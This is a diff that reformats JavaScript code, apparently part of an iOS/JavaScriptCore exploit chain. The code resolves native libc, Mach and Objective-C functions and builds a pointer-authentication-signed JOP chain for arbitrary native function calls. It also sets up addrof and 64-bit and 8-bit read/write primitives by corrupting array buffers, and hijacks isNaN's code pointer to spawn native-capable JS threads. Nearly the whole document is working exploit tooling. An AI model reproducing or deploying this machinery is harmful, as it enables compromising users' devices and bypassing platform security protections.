@@ -1,83 +1,143 @@
 fcall_init();
-let PAGE_SIZE    = 0x4000n;
+let PAGE_SIZE = 0x4000n;
 let KERN_SUCCESS = 0n;
 
 let CALLOC = func_resolve("calloc");
 let MALLOC = func_resolve("malloc");
-let FREE   = func_resolve("free");
+let FREE = func_resolve("free");
 
 let MEMCPY = func_resolve("memcpy");
 let MEMSET = func_resolve("memset");
 
-let SLEEP    = func_resolve("sleep");
-let USLEEP   = func_resolve("usleep");
-let STRCMP   = func_resolve("strcmp");
-let STRCPY   = func_resolve("strcpy");
-let STRNCPY  = func_resolve("strncpy");
+let SLEEP = func_resolve("sleep");
+let USLEEP = func_resolve("usleep");
+let STRCMP = func_resolve("strcmp");
+let STRCPY = func_resolve("strcpy");
+let STRNCPY = func_resolve("strncpy");
 let SNPRINTF = func_resolve("snprintf");
-let PRINTF   = func_resolve("printf");
+let PRINTF = func_resolve("printf");
 
-let ERRNO   = func_resolve("errno");
-let CLOSE   = func_resolve("close");
-let EXIT    = func_resolve("exit");
+let ERRNO = func_resolve("errno");
+let CLOSE = func_resolve("close");
+let EXIT = func_resolve("exit");
 let GETCHAR = func_resolve("getchar");
-let GETPID  = func_resolve("getpid");
+let GETPID = func_resolve("getpid");
 let SYSCALL = func_resolve("syscall");
 
-let MACH_VM_ALLOCATE   = func_resolve("mach_vm_allocate");
+let MACH_VM_ALLOCATE = func_resolve("mach_vm_allocate");
 let MACH_VM_DEALLOCATE = func_resolve("mach_vm_deallocate");
-let MACH_ERROR_STRING  = func_resolve("mach_error_string");
+let MACH_ERROR_STRING = func_resolve("mach_error_string");
 let MACH_PORT_ALLOCATE = func_resolve("mach_port_allocate");
 
 let kIOMasterPortDefault = func_resolve("kIOMasterPortDefault");
 
-function assert(a, b = "N/A")
-{
+function assert(a, b = "N/A") {
     if (!a) {
         throw new Error(`assert failed: ${b}`)
     }
 }
 
-function ERROR(a) { throw new Error(a); }
+function ERROR(a) {
+    throw new Error(a);
+}
 
-function new_uint64_t(val = 0n)
-{
+function new_uint64_t(val = 0n) {
     let buf = calloc(1n, 8n);
     uwrite64(buf, val);
     return buf;
 }
 
-function mach_task_self() { return 0x203n; }
+function mach_task_self() {
+    return 0x203n;
+}
 
-function calloc(...args) { return fcall(CALLOC, ...args); }
-function malloc(...args) { return fcall(MALLOC, ...args); }
-function free(...args) { return fcall(FREE, ...args); }
+function calloc(...args) {
+    return fcall(CALLOC, ...args);
+}
 
-function memcpy(...args) { return fcall(MEMCPY, ...args); }
-function memset(...args) { return fcall(MEMSET, ...args); }
+function malloc(...args) {
+    return fcall(MALLOC, ...args);
+}
 
-function sleep(...args) { return fcall(SLEEP, ...args); }
-function usleep(...args) { return fcall(USLEEP, ...args); }
-function strcmp(...args) { return fcall(STRCMP, ...args); }
-function strcpy(...args) { return fcall(STRCPY, ...args); }
-function strncpy(...args) { return fcall(STRNCPY, ...args); }
-function snprintf(...args) { return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args); }
-function printf(...args) { return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args); }
+function free(...args) {
+    return fcall(FREE, ...args);
+}
 
-function close(...args) { return fcall(CLOSE, ...args); }
-function exit(...args) { return fcall(EXIT, ...args); }
-function getchar(...args) { return fcall(GETCHAR, ...args); }
-function getpid(...args) { return fcall(GETPID, ...args); }
-function syscall(num, ...args) { return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args); }
+function memcpy(...args) {
+    return fcall(MEMCPY, ...args);
+}
 
-function mach_vm_allocate(...args) { return fcall(MACH_VM_ALLOCATE, ...args); }
-function mach_vm_deallocate(...args) { return fcall(MACH_VM_DEALLOCATE, ...args); }
-function mach_error_string(...args) { return fcall(MACH_ERROR_STRING, ...args); }
-function mach_port_allocate(...args) { return fcall(MACH_PORT_ALLOCATE, ...args); }
+function memset(...args) {
+    return fcall(MEMSET, ...args);
+}
+
+function sleep(...args) {
+    return fcall(SLEEP, ...args);
+}
+
+function usleep(...args) {
+    return fcall(USLEEP, ...args);
+}
+
+function strcmp(...args) {
+    return fcall(STRCMP, ...args);
+}
+
+function strcpy(...args) {
+    return fcall(STRCPY, ...args);
+}
+
+function strncpy(...args) {
+    return fcall(STRNCPY, ...args);
+}
+
+function snprintf(...args) {
+    return fcall(SNPRINTF, buf, size, fmt, 0n, 0n, 0n, 0n, 0n, ...args);
+}
+
+function printf(...args) {
+    return fcall(PRINTF, get_cstring(fmt), 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
+}
+
+function close(...args) {
+    return fcall(CLOSE, ...args);
+}
+
+function exit(...args) {
+    return fcall(EXIT, ...args);
+}
+
+function getchar(...args) {
+    return fcall(GETCHAR, ...args);
+}
+
+function getpid(...args) {
+    return fcall(GETPID, ...args);
+}
+
+function syscall(num, ...args) {
+    return fcall(SYSCALL, num, 0n, 0n, 0n, 0n, 0n, 0n, 0n, ...args);
+}
+
+function mach_vm_allocate(...args) {
+    return fcall(MACH_VM_ALLOCATE, ...args);
+}
+
+function mach_vm_deallocate(...args) {
+    return fcall(MACH_VM_DEALLOCATE, ...args);
+}
+
+function mach_error_string(...args) {
+    return fcall(MACH_ERROR_STRING, ...args);
+}
+
+function mach_port_allocate(...args) {
+    return fcall(MACH_PORT_ALLOCATE, ...args);
+}
 
 let g_device_machine = 0n;
-function get_device_machine()
-{
+
+function get_device_machine() {
     if (g_device_machine == 0n) {
         let utsname = calloc(256n, 5n);
         fcall(UNAME, utsname);
@@ -87,101 +147,145 @@ function get_device_machine()
     return g_device_machine;
 }
 
-let OBJC_ALLOC       = func_resolve("objc_alloc");
-let OBJC_ALLOC_INIT  = func_resolve("objc_alloc_init");
-let OBJC_GETCLASS    = func_resolve("objc_getClass");
-let OBJC_MSGSEND     = func_resolve("objc_msgSend");
+let OBJC_ALLOC = func_resolve("objc_alloc");
+let OBJC_ALLOC_INIT = func_resolve("objc_alloc_init");
+let OBJC_GETCLASS = func_resolve("objc_getClass");
+let OBJC_MSGSEND = func_resolve("objc_msgSend");
 let SEL_REGISTERNAME = func_resolve("sel_registerName");
 
-let CFDICTIONARYCREATEMUTABLE       = func_resolve("CFDictionaryCreateMutable");
-let CFDICTIONARYSETVALUE            = func_resolve("CFDictionarySetValue");
-let CFNUMBERCREATE                  = func_resolve("CFNumberCreate");
-let CFRELEASE                       = func_resolve("CFRelease");
-let CFSHOW                          = func_resolve("CFShow");
-let CFSTRINGCREATECOPY              = func_resolve("CFStringCreateCopy");
-let CFSTRINGCREATEWITHCSTRING       = func_resolve("CFStringCreateWithCString");
-let kCFAllocatorDefault             = uread64(func_resolve("kCFAllocatorDefault").noPAC());
-let kCFStringEncodingUTF8           = 0x08000100n;
-let kCFTypeDictionaryKeyCallBacks   = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
+let CFDICTIONARYCREATEMUTABLE = func_resolve("CFDictionaryCreateMutable");
+let CFDICTIONARYSETVALUE = func_resolve("CFDictionarySetValue");
+let CFNUMBERCREATE = func_resolve("CFNumberCreate");
+let CFRELEASE = func_resolve("CFRelease");
+let CFSHOW = func_resolve("CFShow");
+let CFSTRINGCREATECOPY = func_resolve("CFStringCreateCopy");
+let CFSTRINGCREATEWITHCSTRING = func_resolve("CFStringCreateWithCString");
+let kCFAllocatorDefault = uread64(func_resolve("kCFAllocatorDefault").noPAC());
+let kCFStringEncodingUTF8 = 0x08000100n;
+let kCFTypeDictionaryKeyCallBacks = func_resolve("kCFTypeDictionaryKeyCallBacks").noPAC();
 let kCFTypeDictionaryValueCallBacks = func_resolve("kCFTypeDictionaryValueCallBacks").noPAC();
 
-function CFDictionaryCreateMutable(...args) { return fcall(CFDICTIONARYCREATEMUTABLE, ...args); }
-function CFDictionarySetValue(...args) { return fcall(CFDICTIONARYSETVALUE, ...args); }
-function CFNumberCreate(...args) { return fcall(CFNUMBERCREATE, ...args); }
-function CFRelease(...args) { return fcall(CFRELEASE, ...args); }
-function CFShow(...args) { return fcall(CFSHOW, ...args); }
-function CFStringCreateCopy(...args) { return fcall(CFSTRINGCREATECOPY, ...args); }
-function CFStringCreateWithCString(...args) { return fcall(CFSTRINGCREATEWITHCSTRING, ...args); }
+function CFDictionaryCreateMutable(...args) {
+    return fcall(CFDICTIONARYCREATEMUTABLE, ...args);
+}
 
-function objc_alloc(class_obj) { return fcall(OBJC_ALLOC, class_obj); }
-function objc_alloc_init(class_obj) { return fcall(OBJC_ALLOC_INIT, class_obj); }
-function objc_getClass(class_name) { return fcall(OBJC_GETCLASS, get_cstring(class_name)); }
-function objc_msgSend(...args) { return fcall(OBJC_MSGSEND, ...args); }
-function sel_registerName(cstr) { return fcall(SEL_REGISTERNAME, cstr); }
+function CFDictionarySetValue(...args) {
+    return fcall(CFDICTIONARYSETVALUE, ...args);
+}
 
-let selector_evaluateScript                 = sel_registerName(get_cstring("evaluateScript:"));
+function CFNumberCreate(...args) {
+    return fcall(CFNUMBERCREATE, ...args);
+}
+
+function CFRelease(...args) {
+    return fcall(CFRELEASE, ...args);
+}
+
+function CFShow(...args) {
+    return fcall(CFSHOW, ...args);
+}
+
+function CFStringCreateCopy(...args) {
+    return fcall(CFSTRINGCREATECOPY, ...args);
+}
+
+function CFStringCreateWithCString(...args) {
+    return fcall(CFSTRINGCREATEWITHCSTRING, ...args);
+}
+
+function objc_alloc(class_obj) {
+    return fcall(OBJC_ALLOC, class_obj);
+}
+
+function objc_alloc_init(class_obj) {
+    return fcall(OBJC_ALLOC_INIT, class_obj);
+}
+
+function objc_getClass(class_name) {
+    return fcall(OBJC_GETCLASS, get_cstring(class_name));
+}
+
+function objc_msgSend(...args) {
+    return fcall(OBJC_MSGSEND, ...args);
+}
+
+function sel_registerName(cstr) {
+    return fcall(SEL_REGISTERNAME, cstr);
+}
+
+let selector_evaluateScript = sel_registerName(get_cstring("evaluateScript:"));
 let selector_initWithTarget_selector_object = sel_registerName(get_cstring("initWithTarget:selector:object:"));
-let selector_invocationWithMethodSignature  = sel_registerName(get_cstring("invocationWithMethodSignature:"));
-let selector_invoke                         = sel_registerName(get_cstring("invoke"));
-let selector_isFinished                     = sel_registerName(get_cstring("isFinished"));
-let selector_methodSignatureForSelector     = sel_registerName(get_cstring("methodSignatureForSelector:"));
-let selector_objectForKeyedSubscript        = sel_registerName(get_cstring("objectForKeyedSubscript:"));
-let selector_release                        = sel_registerName(get_cstring("release"));
-let selector_retainCount                    = sel_registerName(get_cstring("retainCount"));
-let selector_setArgument_atIndex            = sel_registerName(get_cstring("setArgument:atIndex:"));
-let selector_start                          = sel_registerName(get_cstring("start"));
+let selector_invocationWithMethodSignature = sel_registerName(get_cstring("invocationWithMethodSignature:"));
+let selector_invoke = sel_registerName(get_cstring("invoke"));
+let selector_isFinished = sel_registerName(get_cstring("isFinished"));
+let selector_methodSignatureForSelector = sel_registerName(get_cstring("methodSignatureForSelector:"));
+let selector_objectForKeyedSubscript = sel_registerName(get_cstring("objectForKeyedSubscript:"));
+let selector_release = sel_registerName(get_cstring("release"));
+let selector_retainCount = sel_registerName(get_cstring("retainCount"));
+let selector_setArgument_atIndex = sel_registerName(get_cstring("setArgument:atIndex:"));
+let selector_start = sel_registerName(get_cstring("start"));
 
-let invoke_class   = objc_getClass("NSInvocation");
-let jsc_class      = objc_getClass("JSContext");
+let invoke_class = objc_getClass("NSInvocation");
+let jsc_class = objc_getClass("JSContext");
 let nsthread_class = objc_getClass("NSThread");
 
-function create_cfstring(cstring)
-{
+function create_cfstring(cstring) {
     return CFStringCreateWithCString(kCFAllocatorDefault, cstring, kCFStringEncodingUTF8);
 }
 
-let cfstr_boxed_arr          = create_cfstring(get_cstring("boxed_arr"));
-let cfstr_control_array      = create_cfstring(get_cstring("control_array"));
-let cfstr_control_array_8    = create_cfstring(get_cstring("control_array_8"));
+let cfstr_boxed_arr = create_cfstring(get_cstring("boxed_arr"));
+let cfstr_control_array = create_cfstring(get_cstring("control_array"));
+let cfstr_control_array_8 = create_cfstring(get_cstring("control_array_8"));
 let cfstr_func_offsets_array = create_cfstring(get_cstring("func_offsets_array"));
-let cfstr_isNaN              = create_cfstring(get_cstring("isNaN"));
-let cfstr_rw_array           = create_cfstring(get_cstring("rw_array"));
-let cfstr_rw_array_8         = create_cfstring(get_cstring("rw_array_8"));
-let cfstr_unboxed_arr        = create_cfstring(get_cstring("unboxed_arr"));
+let cfstr_isNaN = create_cfstring(get_cstring("isNaN"));
+let cfstr_rw_array = create_cfstring(get_cstring("rw_array"));
+let cfstr_rw_array_8 = create_cfstring(get_cstring("rw_array_8"));
+let cfstr_unboxed_arr = create_cfstring(get_cstring("unboxed_arr"));
 
-function create_cfstring_copy(cfstring) { return CFStringCreateCopy(kCFAllocatorDefault, cfstring); }
+function create_cfstring_copy(cfstring) {
+    return CFStringCreateCopy(kCFAllocatorDefault, cfstring);
+}
 
-function object_retainCount(obj) { return objc_msgSend(obj, selector_retainCount); }
+function object_retainCount(obj) {
+    return objc_msgSend(obj, selector_retainCount);
+}
 
-function object_release(obj) { return objc_msgSend(obj, selector_release); }
+function object_release(obj) {
+    return objc_msgSend(obj, selector_release);
+}
 
-function objectForKeyedSubscript(obj, cfstr_key)
-{
+function objectForKeyedSubscript(obj, cfstr_key) {
     return objc_msgSend(obj, selector_objectForKeyedSubscript, cfstr_key);
 }
 
-function evaluateScript(obj, jscript) { return objc_msgSend(obj, selector_evaluateScript, jscript); }
+function evaluateScript(obj, jscript) {
+    return objc_msgSend(obj, selector_evaluateScript, jscript);
+}
 
-function methodSignatureForSelector(obj, sel) { return objc_msgSend(obj, selector_methodSignatureForSelector, sel); }
+function methodSignatureForSelector(obj, sel) {
+    return objc_msgSend(obj, selector_methodSignatureForSelector, sel);
+}
 
-function invocationWithMethodSignature(obj, sig)
-{
+function invocationWithMethodSignature(obj, sig) {
     return objc_msgSend(obj, selector_invocationWithMethodSignature, sig);
 }
 
-function setArgument_atIndex(obj, arg, idx) { return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx); }
+function setArgument_atIndex(obj, arg, idx) {
+    return objc_msgSend(obj, selector_setArgument_atIndex, arg, idx);
+}
 
-function initWithTarget_selector_object(obj, target, sel, object)
-{
+function initWithTarget_selector_object(obj, target, sel, object) {
     return objc_msgSend(obj, selector_initWithTarget_selector_object, target, sel, object);
 }
 
-function nsthread_start(obj) { return objc_msgSend(obj, selector_start); }
+function nsthread_start(obj) {
+    return objc_msgSend(obj, selector_start);
+}
 
 function setup_fcall_jopchain() {
-    let jsvm_fcall_buff  = malloc(PAGE_SIZE);
+    let jsvm_fcall_buff = malloc(PAGE_SIZE);
     let load_x1x3x8_args = jsvm_fcall_buff + 0x100n;
-    let jsvm_fcall_args  = jsvm_fcall_buff + 0x200n;
+    let jsvm_fcall_args = jsvm_fcall_buff + 0x200n;
 
     uwrite64(jsvm_fcall_buff + 0x0n, load_x1x3x8_args);
     uwrite64(jsvm_fcall_buff + 0x8n, pacia(load_x1x3x8, 0n));
@@ -194,18 +298,18 @@ function setup_fcall_jopchain() {
     uwrite64(load_x1x3x8_args + 0x50n, pacia(fcall_14_args_write_x8, load_x1x3x8_args + 0x50n));
 
     return {
-        "jsvm_fcall_buff" : jsvm_fcall_buff,
-        "jsvm_fcall_pc" : load_x1x3x8_args + 0x30n,
-        "jsvm_fcall_args" : jsvm_fcall_args,
+        "jsvm_fcall_buff": jsvm_fcall_buff,
+        "jsvm_fcall_pc": load_x1x3x8_args + 0x30n,
+        "jsvm_fcall_args": jsvm_fcall_args,
     };
 }
 
 let evaluateScript_invocation = 0n;
-function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n)
-{
-    if (typeof (js_script_nsstring) === "string") {
+
+function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n) {
+    if (typeof(js_script_nsstring) === "string") {
         js_script_nsstring = create_cfstring(get_cstring(js_script_nsstring));
-    } else if (typeof (js_script_nsstring) === "object") {
+    } else if (typeof(js_script_nsstring) === "object") {
         js_script_nsstring = create_cfstring(uread64(addrof(js_script_nsstring) + 0x10n));
     } else {
         // in this case, it's already a CFString, so let's just copy it
@@ -214,45 +318,45 @@ function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n)
 
     let jop_chain_info = setup_fcall_jopchain();
     let jsvm_fcall_buff = jop_chain_info["jsvm_fcall_buff"];
-    let jsvm_fcall_pc   = jop_chain_info["jsvm_fcall_pc"];
+    let jsvm_fcall_pc = jop_chain_info["jsvm_fcall_pc"];
     let jsvm_fcall_args = jop_chain_info["jsvm_fcall_args"];
 
 
-    let ctx                   = objc_alloc_init(jsc_class);
-    let isnan_value           = objectForKeyedSubscript(ctx, cfstr_isNaN);
-    let isnan_func_addr       = uread64(isnan_value + 0x8n);
+    let ctx = objc_alloc_init(jsc_class);
+    let isnan_value = objectForKeyedSubscript(ctx, cfstr_isNaN);
+    let isnan_func_addr = uread64(isnan_value + 0x8n);
     let isnan_executable_addr = uread64(isnan_func_addr + 0x18n);
-    let isnan_code_ptr        = isnan_executable_addr + 0x28n;
+    let isnan_code_ptr = isnan_executable_addr + 0x28n;
     evaluateScript(ctx, stage1_js);
 
     // setup addrof prims
     let unboxed_arr_value = objectForKeyedSubscript(ctx, cfstr_unboxed_arr);
-    let unboxed_arr_addr  = uread64(unboxed_arr_value + 0x8n);
-    let boxed_arr_value   = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
-    let boxed_arr_addr    = uread64(boxed_arr_value + 0x8n);
-    let boxed_arr_butter  = uread64(boxed_arr_addr + 0x8n);
+    let unboxed_arr_addr = uread64(unboxed_arr_value + 0x8n);
+    let boxed_arr_value = objectForKeyedSubscript(ctx, cfstr_boxed_arr);
+    let boxed_arr_addr = uread64(boxed_arr_value + 0x8n);
+    let boxed_arr_butter = uread64(boxed_arr_addr + 0x8n);
     uwrite64(unboxed_arr_addr + 0x8n, boxed_arr_butter);
 
     // setup rw64 prim
-    let rw_array_addr           = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
-    let control_array_addr      = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
-    let rw_array_buffer_bk      = uread64(rw_array_addr + 0x10n);
+    let rw_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array) + 0x8n);
+    let control_array_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array) + 0x8n);
+    let rw_array_buffer_bk = uread64(rw_array_addr + 0x10n);
     let control_array_buffer_bk = uread64(control_array_addr + 0x10n);
     uwrite64(control_array_addr + 0x10n, rw_array_addr + 0x10n);
 
     // setup rw8 prim
-    let rw_array_8_addr           = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
-    let control_array_8_addr      = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
-    let rw_array_8_buffer_bk      = uread64(rw_array_8_addr + 0x10n);
+    let rw_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_rw_array_8) + 0x8n);
+    let control_array_8_addr = uread64(objectForKeyedSubscript(ctx, cfstr_control_array_8) + 0x8n);
+    let rw_array_8_buffer_bk = uread64(rw_array_8_addr + 0x10n);
     let control_array_8_buffer_bk = uread64(control_array_8_addr + 0x10n);
     uwrite64(control_array_8_addr + 0x10n, rw_array_8_addr + 0x10n);
 
-    let signing_ctx       = 0x4911n;
+    let signing_ctx = 0x4911n;
     let signed_fcall_addr = pacib(jsvm_isNAN_fcall_gadget, signing_ctx);
     uwrite64(isnan_code_ptr, signed_fcall_addr);
 
-    let new_func_offsets        = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
-    let new_func_offsets_addr   = uread64(new_func_offsets + 0x8n);
+    let new_func_offsets = objectForKeyedSubscript(ctx, cfstr_func_offsets_array);
+    let new_func_offsets_addr = uread64(new_func_offsets + 0x8n);
     let new_func_offsets_buffer = uread64(new_func_offsets_addr + 0x10n);
 
     memcpy(new_func_offsets_buffer, func_offsets_buffer, PAGE_SIZE)
@@ -263,7 +367,7 @@ function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n)
 
     if (evaluateScript_invocation == 0n) {
         let evaluateScript_signature = methodSignatureForSelector(ctx, selector_evaluateScript);
-        evaluateScript_invocation    = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
+        evaluateScript_invocation = invocationWithMethodSignature(invoke_class, evaluateScript_signature);
         setArgument_atIndex(evaluateScript_invocation, new_uint64_t(selector_evaluateScript), 1n);
     }
 
@@ -275,23 +379,22 @@ function js_thread_spawn(js_script_nsstring, target_thread_arg = 0x0n)
     nsthread_start(nsthread);
 
     return {
-        "thread_handle" : nsthread,
-        "js_ctx" : ctx,
-        "jop_chain_info" : jop_chain_info,
-        "js_script_nsstring" : js_script_nsstring,
-        "rw_array_buffer_bk" : rw_array_buffer_bk,
-        "control_array_buffer_bk" : control_array_buffer_bk,
-        "rw_array_8_buffer_bk" : rw_array_8_buffer_bk,
-        "control_array_8_buffer_bk" : control_array_8_buffer_bk,
+        "thread_handle": nsthread,
+        "js_ctx": ctx,
+        "jop_chain_info": jop_chain_info,
+        "js_script_nsstring": js_script_nsstring,
+        "rw_array_buffer_bk": rw_array_buffer_bk,
+        "control_array_buffer_bk": control_array_buffer_bk,
+        "rw_array_8_buffer_bk": rw_array_8_buffer_bk,
+        "control_array_8_buffer_bk": control_array_8_buffer_bk,
     };
 }
 
-function js_thread_join(js_thread)
-{
-    let jop_chain_info     = js_thread["jop_chain_info"];
-    let js_ctx             = js_thread["js_ctx"];
+function js_thread_join(js_thread) {
+    let jop_chain_info = js_thread["jop_chain_info"];
+    let js_ctx = js_thread["js_ctx"];
     let js_script_nsstring = js_thread["js_script_nsstring"];
-    let nsthread           = js_thread["thread_handle"];
+    let nsthread = js_thread["thread_handle"];
 
     // wait until the thread is finished and release it
     while (true) {
@@ -305,12 +408,12 @@ function js_thread_join(js_thread)
     // revert rw64 prim
     uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array) + 0x8n) + 0x10n, js_thread["rw_array_buffer_bk"]);
     uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array) + 0x8n) + 0x10n,
-             js_thread["control_array_buffer_bk"]);
+        js_thread["control_array_buffer_bk"]);
     // revert rw8 prim
     uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_rw_array_8) + 0x8n) + 0x10n,
-             js_thread["rw_array_8_buffer_bk"]);
+        js_thread["rw_array_8_buffer_bk"]);
     uwrite64(uread64(objectForKeyedSubscript(js_ctx, cfstr_control_array_8) + 0x8n) + 0x10n,
-             js_thread["control_array_8_buffer_bk"]);
+        js_thread["control_array_8_buffer_bk"]);
     // release js context
     let jsc_ref_count = object_retainCount(js_ctx);
     for (let i = 0n; i < jsc_ref_count; i++) {
@@ -604,7 +707,7 @@ function mach_task_self() {
     return 0x203n;
 }
 
-function new_uint64_t(val=0n) {
+function new_uint64_t(val = 0n) {
     let buf = calloc(1n, 8n);
     uwrite64(buf, val);
     return buf;
